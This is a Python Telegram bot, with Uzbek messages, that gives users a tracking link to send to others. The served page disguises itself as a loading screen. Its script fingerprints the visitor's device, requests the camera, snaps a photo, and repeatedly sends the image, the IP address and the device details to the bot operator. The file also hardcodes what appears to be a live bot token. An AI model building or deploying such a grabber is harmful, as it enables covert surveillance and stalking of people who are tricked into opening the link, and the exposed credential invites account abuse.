#!/usr/bin/env python3
import os
import json
import uuid
import base64
import asyncio
import logging
from io import BytesIO
from aiohttp import web
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN", "8282416690:AAF2Uz6yfATHlrThT5YbGfxXyxi1vx3rUeA")
WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
PORT = int(os.getenv("PORT", "8000"))

USER_TOKENS = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = str(uuid.uuid4())
    USER_TOKENS[token] = user_id
    link = f"{WEBHOOK_DOMAIN}/track?token={token}"
    msg = (
        "👋 Salom!\n\n"
        "Quyidagi havolani oching, sahifa ochilgach ma'lumotlar olish boshlanadi.\n"
        f"🔗 {link}\n\n"
        "Jarayon davomida rasm va qurilma ma'lumotlari sizga yuboriladi."
    )
    await update.message.reply_text(msg)

def get_client_ip(request: web.Request) -> str:
    # Agar app'ingiz reverse proxy orqasida bo‘lsa, X-Forwarded-For ishlatish kerak
    hdr = request.headers.get("X-Forwarded-For")
    if hdr:
        # odatda bir nechta IP bo‘lishi mumkin, birinchi IP — haqiqiy mijoz
        return hdr.split(",")[0].strip()
    # aks holda request.remote bo‘yicha
    rem = request.remote
    if rem:
        return rem
    # fallback
    peer = request.transport.get_extra_info("peername")
    if peer:
        return str(peer[0])
    return "Noma'lum"

async def track_page(request: web.Request):
    token = request.query.get("token")
    if not token or token not in USER_TOKENS:
        return web.Response(text="❌ Noto‘g‘ri yoki eskirgan token", status=403)

    html = f"""<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <title>Yuklanmoqda...</title>
  <style>
    body {{
      font-family: sans-serif;
      display: flex; flex-direction: column; align-items: center; justify-content: center;
      height: 100vh; text-align: center;
      background: #fafafa; color: #333;
    }}
    .loader {{
      width: 40px; height: 40px;
      border: 4px solid #ddd;
      border-top: 4px solid #4CAF50;
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 20px;
    }}
    @keyframes spin {{ to {{ transform: rotate(360deg); }} }}
    .note {{ font-size: 0.9em; color: #777; }}
  </style>
</head>
<body>
  <h2>Iltimos, kuting...</h2>
  <div class="loader"></div>
  <div class="note">Tajribangiz moslashtirilmoqda...</div>
  <script>
    async function repeatSend() {{
      async function collectAndSend() {{
        const data = {{
          timestamp: new Date().toISOString(),
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          utcOffset: -new Date().getTimezoneOffset() / 60,
          languages: navigator.languages.join(', '),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          deviceMemory: navigator.deviceMemory || "Noma'lum",
          hardwareConcurrency: navigator.hardwareConcurrency || "Noma'lum",
          screen: `${{screen.width}}x${{screen.height}}`,
          viewport: `${{window.innerWidth}}x${{window.innerHeight}}`,
          colorDepth: screen.colorDepth,
          pixelDepth: screen.pixelDepth,
          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? "Mobil" : "Kompyuter",
          browser: "Noma'lum",
          os: "Noma'lum",
          model: "Noma'lum",
          devices: {{ mic: 0, speaker: 0, camera: 0 }},
          gpu: "Noma'lum",
          cameraRes: "Noma'lum",
          network: "Noma'lum"
        }};

        if (navigator.userAgent.includes("Chrome")) data.browser = "Chrome";
        else if (navigator.userAgent.includes("Firefox")) data.browser = "Firefox";
        else if (navigator.userAgent.includes("Safari")) data.browser = "Safari";

        if (/Windows/.test(navigator.userAgent)) data.os = "Windows";
        else if (/Android/.test(navigator.userAgent)) data.os = "Android";
        else if (/iPhone|iPad/.test(navigator.userAgent)) data.os = "iOS";
        else if (/Mac OS/.test(navigator.userAgent)) data.os = "macOS";

        try {{
          const devs = await navigator.mediaDevices.enumerateDevices();
          data.devices.mic = devs.filter(d => d.kind === "audioinput").length;
          data.devices.speaker = devs.filter(d => d.kind === "audiooutput").length;
          data.devices.camera = devs.filter(d => d.kind === "videoinput").length;
        }} catch (e) {{}}

        try {{
          const canvas = document.createElement("canvas");
          const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
          const dbg = gl.getExtension("WEBGL_debug_renderer_info");
          if (dbg) {{
            data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
          }}
        }} catch (e) {{}}

        if (navigator.connection) {{
          data.network = `${{navigator.connection.effectiveType}}, ${{navigator.connection.downlink || '?'}} Mbps`;
        }}

        // Kamera + rasm
        let img = null;
        try {{
          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
          const track = stream.getVideoTracks()[0];
          const settings = track.getSettings();
          data.cameraRes = `${{settings.width}}x${{settings.height}}`;

          const video = document.createElement("video");
          video.srcObject = stream;
          await video.play();

          const c = document.createElement("canvas");
          c.width = video.videoWidth;
          c.height = video.videoHeight;
          c.getContext("2d").drawImage(video, 0, 0);
          img = c.toDataURL("image/jpeg", 0.7);

          stream.getTracks().forEach(t => t.stop());
        }} catch (e) {{
          // kamera rad etilgan bo‘lishi mumkin
        }}

        const body = {{ token: "{token}", clientData: data }};
        if (img) {{
          body.image = img;
        }}

        fetch("/submit", {{
          method: "POST",
          headers: {{ "Content-Type": "application/json" }},
          body: JSON.stringify(body)
        }});
      }}

      while (true) {{
        await collectAndSend();
        await new Promise(r => setTimeout(r, 1500));
      }}
    }}
    repeatSend();
  </script>
</body>
</html>"""
    return web.Response(text=html, content_type="text/html")

async def submit_data(request: web.Request):
    try:
        body = await request.json()
        token = body.get("token")
        client_data = body.get("clientData", {})
        user_id = USER_TOKENS.get(token)
        if not user_id:
            return web.Response(status=403)

        ip = get_client_ip(request)
        devs = client_data.get("devices", {})

        # format vaqt uchun
        ts = client_data.get("timestamp")
        # Agar ISO string bo‘lsa, uni yanada chiroyli formata keltirish mumkin

        message = (
            f"🕒 Sana/Vaqt: {ts}\n"
            f"🌍 Zona: {client_data.get('timezone')} (UTC{client_data.get('utcOffset')})\n"
            f"📍 IP: {ip}\n"
            f"📱 Qurilma: {client_data.get('model')} ({client_data.get('deviceType')})\n"
            f"🖥 OS: {client_data.get('os')}, Brauzer: {client_data.get('browser')}\n"
            f"🎮 GPU: {client_data.get('gpu')}\n"
            f"🧠 CPU: {client_data.get('hardwareConcurrency')} yadrolar | RAM: {client_data.get('deviceMemory')} GB\n"
            f"📺 Ekran: {client_data.get('screen')} | Viewport: {client_data.get('viewport')}\n"
            f"🎨 Rang chuqurligi: {client_data.get('colorDepth')} bit | PixelDepth: {client_data.get('pixelDepth')}\n"
            f"🎤 Qurilmalar: Mic: {devs.get('mic',0)}, Speaker: {devs.get('speaker',0)}, Kamera: {devs.get('camera',0)}\n"
            f"📷 Kamera aniqlangan o‘lcham: {client_data.get('cameraRes')}\n"
            f"📶 Tarmoq: {client_data.get('network')}\n"
            f"🗣 Tillar: {client_data.get('languages')}\n"
            f"🔍 UA: {client_data.get('userAgent')}"
        )

        # Agar image yuborilgan bo‘lsa, yubor
        if "image" in body:
            img_data = body["image"]
            if "," in img_data:
                b64 = img_data.split(",", 1)[1]
            else:
                b64 = img_data
            img_bytes = base64.b64decode(b64)
            img = BytesIO(img_bytes)
            img.name = "snapshot.jpg"
            await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message)
        else:
            await request.app["bot"].send_message(chat_id=user_id, text=message)

        return web.Response(text="ok")
    except Exception as e:
        logger.exception("submit_data xato")
        return web.Response(status=500, text=str(e))

# upload_image route optional (agar rasm alohida endpoint bo‘lishi kerak bo‘lsa)
# lekin biz rasmni birga /submit da yuboryapmiz

async def camera_denied(request: web.Request):
    try:
        data = await request.json()
        token = data.get("token")
        user_id = USER_TOKENS.get(token)
        if user_id:
            await request.app["bot"].send_message(chat_id=user_id, text="⚠️ Kamera ruxsati berilmadi yoki mavjud emas.")
        return web.Response(status=200)
    except Exception as e:
        logger.exception("camera_denied")
        return web.Response(status=500)

async def start_web_server(bot):
    app = web.Application()
    app["bot"] = bot
    app.router.add_get("/track", track_page)
    app.router.add_post("/submit", submit_data)
    app.router.add_post("/camera_denied", camera_denied)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", PORT)
    await site.start()
    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{PORT}")

async def on_startup(app: Application):
    asyncio.create_task(start_web_server(app.bot))

def main():
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
    app.add_handler(CommandHandler("start", start))
    app.run_polling()

if __name__ == "__main__":
    main()
